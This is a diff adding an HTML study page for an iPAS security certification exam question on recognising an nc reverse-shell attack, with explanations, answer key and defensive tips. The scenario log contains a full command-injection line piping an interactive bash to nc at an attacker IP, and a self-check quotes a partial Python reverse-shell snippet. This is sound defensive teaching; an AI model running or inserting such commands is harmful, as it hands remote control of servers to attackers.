@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPAS 資安【題組 4】第 35 題：nc 反向連線攻擊分析</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #34495e;
+            --accent-color: #3498db;
+            --success-color: #27ae60;
+            --error-color: #c0392b;
+            --bg-color: #f4f6f7;
+            --card-bg: #ffffff;
+            --text-color: #333;
+            --border-radius: 8px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", "Microsoft JhengHei", sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            padding-bottom: 50px;
+        }
+
+        /* Header & Progress */
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            max-width: 800px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        h1 {
+            font-size: 1.2rem;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        .progress-container {
+            width: 100%;
+            max-width: 800px;
+            margin: 10px auto 0;
+            background-color: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            height: 8px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background-color: var(--accent-color);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+        /* Cards */
+        .card {
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: var(--border-radius);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+            border-left: 5px solid var(--accent-color);
+        }
+
+        .card-header {
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .scenario-box {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            border: 1px solid #e0e0e0;
+            margin-bottom: 15px;
+        }
+
+        .log-code {
+            font-family: "Consolas", "Monaco", monospace;
+            background-color: #2d2d2d;
+            color: #dcdcdc;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        .log-img {
+            display: block;
+            max-width: 100%;
+            height: auto;
+            margin: 15px auto;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        /* Quiz Styles */
+        .quiz-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .option-label {
+            display: flex;
+            align-items: flex-start;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .option-label:hover {
+            border-color: var(--accent-color);
+            background-color: #f0f8ff;
+        }
+
+        .option-label input {
+            margin-right: 12px;
+            margin-top: 5px;
+        }
+
+        .btn-group {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: opacity 0.2s;
+        }
+
+        .btn-submit {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .btn-reset {
+            background-color: #95a5a6;
+            color: white;
+            display: none; /* Hidden initially */
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        .feedback {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .feedback.correct {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .feedback.wrong {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        /* Accordion / Details */
+        details {
+            background-color: white;
+            margin-bottom: 10px;
+            border-radius: var(--border-radius);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            overflow: hidden;
+            border: 1px solid #eee;
+        }
+
+        summary {
+            padding: 15px;
+            cursor: pointer;
+            font-weight: bold;
+            background-color: #fcfcfc;
+            list-style: none; /* Hide default triangle */
+            position: relative;
+            padding-left: 40px;
+            transition: background-color 0.2s;
+        }
+
+        summary::-webkit-details-marker {
+            display: none;
+        }
+
+        summary:hover {
+            background-color: #f0f0f0;
+        }
+
+        summary::before {
+            content: "+";
+            position: absolute;
+            left: 15px;
+            font-weight: bold;
+            color: var(--accent-color);
+            font-size: 1.2rem;
+            line-height: 1;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        details[open] summary::before {
+            content: "-";
+            color: var(--error-color);
+        }
+
+        details[open] summary {
+            border-bottom: 1px solid #eee;
+        }
+
+        .details-content {
+            padding: 20px;
+            background-color: white;
+        }
+
+        /* Content Highlights */
+        .highlight-term {
+            color: var(--error-color);
+            font-weight: bold;
+            background-color: #fff3cd;
+            padding: 0 4px;
+            border-radius: 3px;
+        }
+
+        .highlight-cmd {
+            font-family: monospace;
+            background-color: #eee;
+            padding: 2px 5px;
+            border-radius: 3px;
+            color: #c7254e;
+        }
+
+        .step-list {
+            list-style-type: none;
+        }
+
+        .step-list li {
+            margin-bottom: 10px;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .step-list li::before {
+            content: "→";
+            position: absolute;
+            left: 0;
+            color: var(--accent-color);
+        }
+
+        /* Self Check */
+        .self-check-item {
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px dashed #eee;
+        }
+
+        .self-check-item:last-child {
+            border-bottom: none;
+        }
+
+        .check-btn {
+            background-color: var(--accent-color);
+            color: white;
+            font-size: 0.8rem;
+            padding: 5px 10px;
+            margin-top: 5px;
+        }
+
+        .answer-reveal {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #e8f4fc;
+            border-left: 3px solid var(--accent-color);
+            display: none;
+            font-size: 0.95rem;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #7f8c8d;
+            margin-top: 40px;
+            padding: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .header-content {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .progress-container {
+                margin-top: 15px;
+            }
+            .card {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-content">
+            <div>
+                <h1>iPAS 資安【題組 4】第 35 題</h1>
+                <div class="subtitle">nc 反向連線（反彈 Shell）攻擊情境判斷</div>
+            </div>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div style="font-size: 0.8rem; color: #ecf0f1; text-align: center; margin-top: 5px;">
+            學習進度
+        </div>
+    </header>
+
+    <div class="container">
+
+        <!-- 題組情境區塊 -->
+        <div class="card">
+            <div class="card-header">題組情境</div>
+            <div class="scenario-box">
+                <p><strong>情境摘要：</strong></p>
+                <p>你是企業藍隊防禦人員，SOC 告警顯示某伺服器的 ping 功能疑似遭指令注入利用。應用程式日誌出現下列可疑內容，顯示攻擊者可能已嘗試取得遠端控制權：</p>
+                
+                <div class="log-code">127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt</div>
+                
+                <p><strong>日誌截圖：</strong></p>
+                <img src="https://i.meee.com.tw/zmoyb9O.jpg" alt="應用程式日誌截圖" class="log-img">
+            </div>
+
+            <div class="card-header" style="border-top: 1px solid #eee; padding-top: 15px; margin-top: 15px;">第 35 題（單選題）</div>
+            <p style="margin-bottom: 15px;">請問上述日誌的內容，可能代表下列何種攻擊情境？（請選擇最合適的選項）</p>
+
+            <div class="quiz-options" id="quizForm">
+                <label class="option-label">
+                    <input type="radio" name="q35" value="A">
+                    <span>(A) 攻擊者想要勘查 192.168.99.100 的 80 port 是否可進行連線，可以連線就可以讀取更多網頁內容</span>
+                </label>
+                <label class="option-label">
+                    <input type="radio" name="q35" value="B">
+                    <span>(B) 攻擊者想要讀取 /bin/bash 這個檔案內容，並且把結果輸出到 /tmp/tmp.txt 裡面</span>
+                </label>
+                <label class="option-label">
+                    <input type="radio" name="q35" value="C">
+                    <span>(C) 攻擊者想要透過 nc 進行反向連線，讓 192.168.99.100 這台電腦可以對伺服器輸入指令</span>
+                </label>
+                <label class="option-label">
+                    <input type="radio" name="q35" value="D">
+                    <span>(D) 攻擊者想要讀取作業系統的版本資訊，並且尋找有無可利用的漏洞直接對作業系統進行攻擊</span>
+                </label>
+            </div>
+
+            <div class="btn-group">
+                <button class="btn-submit" onclick="checkAnswer()">送出答案</button>
+                <button class="btn-reset" id="resetBtn" onclick="resetQuiz()">重設作答</button>
+            </div>
+
+            <div class="feedback" id="feedbackBox"></div>
+        </div>
+
+        <p style="text-align: center; color: #7f8c8d; margin-bottom: 20px;">↓ 點擊下方區塊展開詳細解析 ↓</p>
+
+        <!-- 1. 找關鍵字 -->
+        <details onclick="trackInteraction('accordion')">
+            <summary>第一步：拆解關鍵字與線索</summary>
+            <div class="details-content">
+                <ul class="step-list">
+                    <li><span class="highlight-cmd">/bin/bash -i</span><br>
+                        <strong>解釋：</strong>啟動一個「互動式」的 shell（指令介面）。這代表執行的不是單純的批次檔，而是希望能像真人一樣即時輸入指令並獲得回應。
+                    </li>
+                    <li><span class="highlight-cmd">2>&1</span><br>
+                        <strong>解釋：</strong>這是標準錯誤（Standard Error, 2）導向標準輸出（Standard Output, 1）的寫法。
+                        <br><em>白話：</em>「不管執行成功或發生錯誤，所有的訊息都要顯示出來」，確保遠端的攻擊者不會漏看任何錯誤訊息。
+                    </li>
+                    <li><span class="highlight-cmd">|</span>（管線符號）<br>
+                        <strong>解釋：</strong>把前一個指令（bash）的輸出結果，直接餵給下一個指令（nc）處理。
+                    </li>
+                    <li><span class="highlight-cmd">nc</span> (netcat)<br>
+                        <strong>解釋：</strong>網路工具中的瑞士刀。這裡被用來建立與外部電腦的連線。
+                    </li>
+                    <li><span class="highlight-cmd">192.168.99.100 80</span><br>
+                        <strong>解釋：</strong>這是<strong>攻擊者控制的電腦 IP</strong> 與 Port。受害伺服器正在連線到這台機器。
+                    </li>
+                    <li><span class="highlight-term">反向連線</span> (Reverse Connection)<br>
+                        <strong>解釋：</strong>由「受害主機」主動連線給「攻擊者」。這通常是為了避開防火牆「擋入不擋出」的規則。
+                    </li>
+                </ul>
+            </div>
+        </details>
+
+        <!-- 2. 白話翻譯 -->
+        <details onclick="trackInteraction('accordion')">
+            <summary>第二步：整句指令白話翻譯</summary>
+            <div class="details-content">
+                <div style="background: #eef2f3; padding: 15px; border-left: 4px solid var(--primary-color);">
+                    <p>「這段指令不是在看網頁，也不是單純在讀取檔案...」</p>
+                    <p style="margin-top: 10px; font-weight: bold;">
+                        「它是把受害主機上一個可以下指令的終端機 (bash)，透過網路線直接『接』給遠端的攻擊者 (nc)，讓對方可以即時遠端遙控這台伺服器。」
+                    </p>
+                </div>
+            </div>
+        </details>
+
+        <!-- 3. 解題思路 -->
+        <details onclick="trackInteraction('accordion')">
+            <summary>第三步：解題思路與核心觀念</summary>
+            <div class="details-content">
+                <p><strong>這題在考什麼？</strong></p>
+                <p>這是一個標準的 <span class="highlight-term">反彈 Shell (Reverse Shell)</span> 攻擊判斷題。</p>
+                <hr style="margin: 15px 0; border: 0; border-top: 1px solid #eee;">
+                
+                <p><strong>判斷三步驟：</strong></p>
+                <ol style="margin-left: 20px;">
+                    <li>看到 <span class="highlight-cmd">bash -i</span> → 代表有人想啟動互動模式下指令。</li>
+                    <li>看到 <span class="highlight-cmd">| nc IP Port</span> → 代表要把前面指令的畫面傳送給遠端的 IP。</li>
+                    <li>綜合起來 → 受害者把自己的控制權交給了遠端 IP。</li>
+                </ol>
+                <hr style="margin: 15px 0; border: 0; border-top: 1px solid #eee;">
+
+                <p><strong>原理比喻：</strong></p>
+                <p>一般的攻擊（正向連線）像是小偷試圖撬開你家大門（防火牆通常會擋）。</p>
+                <p><strong>反向連線</strong>則像是小偷在你家裝了內線電話，叫你家裡的人（受害伺服器）<strong>主動打電話給小偷</strong>。因為是從內部打出去的電話，警衛（防火牆）通常不會攔截，接通後小偷就可以在電話裡指使你做事。</p>
+            </div>
+        </details>
+
+        <!-- 4. 選項分析 -->
+        <details onclick="trackInteraction('accordion')">
+            <summary>第四步：選項逐一分析</summary>
+            <div class="details-content">
+                <div style="margin-bottom: 15px;">
+                    <strong style="color: var(--error-color);">(A) 錯誤</strong>
+                    <p>雖然有 Port 80，但攻擊者用的是 <code>bash -i</code>（互動介面）而不是單純的連線測試。如果是要勘查 Port，通常會用 <code>nc -z</code> 或 <code>curl</code>、<code>wget</code>，不需要啟動 bash。</p>
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <strong style="color: var(--error-color);">(B) 錯誤</strong>
+                    <p>讀取檔案內容通常使用 <code>cat</code>、<code>less</code> 或 <code>more</code> 指令。這裡是執行 <code>/bin/bash</code> 這個程式，而不是讀取它的二進位內容。</p>
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <strong style="color: var(--success-color);">(C) 正確</strong>
+                    <p>完全符合特徵：<strong>bash -i</strong> 提供指令環境，<strong>nc</strong> 負責網路傳輸，由內向外連線（反向），目的是讓攻擊者取得遠端控制權。</p>
+                </div>
+                <div>
+                    <strong style="color: var(--error-color);">(D) 錯誤</strong>
+                    <p>讀取作業系統版本通常使用 <code>uname -a</code> 或 <code>cat /etc/*release</code>。雖然攻擊者取得 shell 後可能會做這件事，但這行指令本身的動作是在「建立連線管道」，而非「查詢版本」。</p>
+                </div>
+            </div>
+        </details>
+
+        <!-- 觀念補充 -->
+        <details onclick="trackInteraction('accordion')">
+            <summary>觀念補充：記憶口訣與陷阱</summary>
+            <div class="details-content">
+                <div class="card" style="box-shadow: none; border: 1px dashed #ccc; margin-bottom: 0;">
+                    <p><strong>記憶口訣：</strong></p>
+                    <ul style="margin-left: 20px; margin-bottom: 15px;">
+                        <li>「bash 加 nc，八成是反彈 shell。」</li>
+                        <li>「受害者主動連出，就是反向連線。」</li>
+                    </ul>
+
+                    <p><strong>常見陷阱與避坑：</strong></p>
+                    <ul style="margin-left: 20px;">
+                        <li><strong>不要只看 Port 80：</strong> 很多人看到 80 就以為是網頁瀏覽。攻擊者常故意用 80 或 443 Port 來接收反彈 Shell，因為防火牆最容易放行這兩個 Port。</li>
+                        <li><strong>區分 nc 用途：</strong> nc 既可以是測試工具，也可以是攻擊武器，關鍵在於它搭配了什麼（本題搭配了 bash）。</li>
+                    </ul>
+                </div>
+            </div>
+        </details>
+
+        <!-- 自我檢測 -->
+        <details onclick="trackInteraction('accordion')">
+            <summary>自我檢測 (3題)</summary>
+            <div class="details-content">
+                <div class="self-check-item">
+                    <p><strong>Q1: 為什麼攻擊者偏好使用「反向 (Reverse)」Shell 而不是「正向 (Bind)」Shell？</strong></p>
+                    <button class="check-btn" onclick="toggleAnswer('ans1')">顯示答案</button>
+                    <div id="ans1" class="answer-reveal">
+                        因為企業防火牆通常設定較嚴格的「進入 (Inbound)」規則，會阻擋外部主動連入；但對於「出去 (Outbound)」的連線通常較寬鬆。反向連線由內部發起，較容易繞過防火牆。
+                    </div>
+                </div>
+
+                <div class="self-check-item">
+                    <p><strong>Q2: 若日誌中沒有 nc，但看到 python -c 'import socket,subprocess,os;s=socket.socket(...)'，這可能代表什麼？</strong></p>
+                    <button class="check-btn" onclick="toggleAnswer('ans2')">顯示答案</button>
+                    <div id="ans2" class="answer-reveal">
+                        這也是反彈 Shell！當目標主機沒有安裝 nc 時，攻擊者常利用內建的 Python、Perl 或 PHP 程式碼來建立 socket 連線，達到相同的遠端控制效果。
+                    </div>
+                </div>
+
+                <div class="self-check-item">
+                    <p><strong>Q3: 防禦端可以用什麼方式來阻斷這種反彈 Shell？</strong></p>
+                    <button class="check-btn" onclick="toggleAnswer('ans3')">顯示答案</button>
+                    <div id="ans3" class="answer-reveal">
+                        1. 嚴格設定防火牆的出站 (Outbound) 規則，禁止伺服器主動連線到未知的外部 IP。<br>
+                        2. 監控執行程序，偵測 web server 行程（如 httpd/nginx）是否異常產生了 shell 行程（如 bash/sh）。
+                    </div>
+                </div>
+            </div>
+        </details>
+
+    </div>
+
+    <footer>
+        <p>iPAS 資安實務題組解析教學 | 題組 4 - 第 35 題</p>
+    </footer>
+
+    <script>
+        // Progress Tracking State
+        const progressState = {
+            quizDone: false,
+            accordionOpened: false,
+            selfCheckOpened: false
+        };
+
+        function updateProgress() {
+            let score = 0;
+            if (progressState.quizDone) score += 34;
+            if (progressState.accordionOpened) score += 33;
+            if (progressState.selfCheckOpened) score += 33;
+            
+            // Cap at 100%
+            if (score > 100) score = 100;
+            
+            document.getElementById('progressBar').style.width = score + '%';
+        }
+
+        function trackInteraction(type) {
+            if (type === 'accordion') {
+                if (!progressState.accordionOpened) {
+                    progressState.accordionOpened = true;
+                    updateProgress();
+                }
+            } else if (type === 'selfcheck') {
+                if (!progressState.selfCheckOpened) {
+                    progressState.selfCheckOpened = true;
+                    updateProgress();
+                }
+            }
+        }
+
+        // Quiz Logic
+        function checkAnswer() {
+            const options = document.getElementsByName('q35');
+            let selectedValue = null;
+            const feedbackBox = document.getElementById('feedbackBox');
+            const resetBtn = document.getElementById('resetBtn');
+
+            for (const option of options) {
+                if (option.checked) {
+                    selectedValue = option.value;
+                    break;
+                }
+            }
+
+            if (!selectedValue) {
+                alert('請先選擇一個答案！');
+                return;
+            }
+
+            // Update Progress
+            if (!progressState.quizDone) {
+                progressState.quizDone = true;
+                updateProgress();
+            }
+
+            resetBtn.style.display = 'inline-block';
+            feedbackBox.style.display = 'block';
+            feedbackBox.className = 'feedback'; // Reset classes
+
+            if (selectedValue === 'C') {
+                feedbackBox.classList.add('correct');
+                feedbackBox.innerHTML = `
+                    <strong>(O) 回答正確！</strong><br>
+                    提示：看到 bash -i 加上 nc，這就是標準的建立反向 Shell 行為。<br>
+                    <strong>正解原因：</strong>利用 bash 提供指令環境，並透過 nc 建立反向連線讓攻擊者控制。
+                `;
+            } else {
+                feedbackBox.classList.add('wrong');
+                feedbackBox.innerHTML = `
+                    <strong>(X) 回答錯誤。</strong><br>
+                    提示：請仔細看指令中的 "| nc" 和 "bash -i"。<br>
+                    這不是單純的檔案讀取或掃描，而是建立了某種「控制通道」。<br>
+                    <span style="font-size: 0.9em; color: #555;">(請參考下方詳細解析中的「關鍵字」與「選項分析」)</span>
+                `;
+            }
+        }
+
+        function resetQuiz() {
+            const options = document.getElementsByName('q35');
+            for (const option of options) {
+                option.checked = false;
+            }
+            document.getElementById('feedbackBox').style.display = 'none';
+            document.getElementById('resetBtn').style.display = 'none';
+        }
+
+        // Self Check Toggle
+        function toggleAnswer(id) {
+            const answerDiv = document.getElementById(id);
+            if (answerDiv.style.display === 'block') {
+                answerDiv.style.display = 'none';
+            } else {
+                answerDiv.style.display = 'block';
+                trackInteraction('selfcheck');
+            }
+        }
+    </script>
+</body>
+</html>
